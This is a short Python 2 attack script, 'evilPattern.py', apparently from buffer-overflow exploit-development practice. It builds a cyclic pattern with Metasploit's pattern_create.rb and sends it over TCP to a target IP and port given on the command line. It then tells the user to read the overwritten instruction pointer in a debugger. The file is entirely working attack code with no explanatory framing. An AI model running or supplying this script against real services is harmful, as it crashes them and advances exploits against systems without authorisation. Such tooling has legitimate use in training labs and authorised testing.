#!/usr/bin/python
import socket
from sys import argv
import subprocess
if len(argv) != 4:
	print "Usage: evilPattern.py [ip] [port] [size]"
	exit(0)
HOST = argv[1]
PORT = argv[2]
SIZE = argv[3]
try:
	PATTERN = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", SIZE], stdout=subprocess.PIPE)
	PAYLOAD = PATTERN.stdout.read()
	print "[*] Connecting to {}...".format(HOST)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, int(PORT)))
	BANNER = s.recv(1024)
	print "[x] Connected to {}".format(BANNER)
	print "[*] Sending payload..."
	s.send(PAYLOAD)
	s.close()
	print "[x] Payload delivered, check your debugger to read the value of the instruction pointer" 
except:
	print "[!] Connection failed"
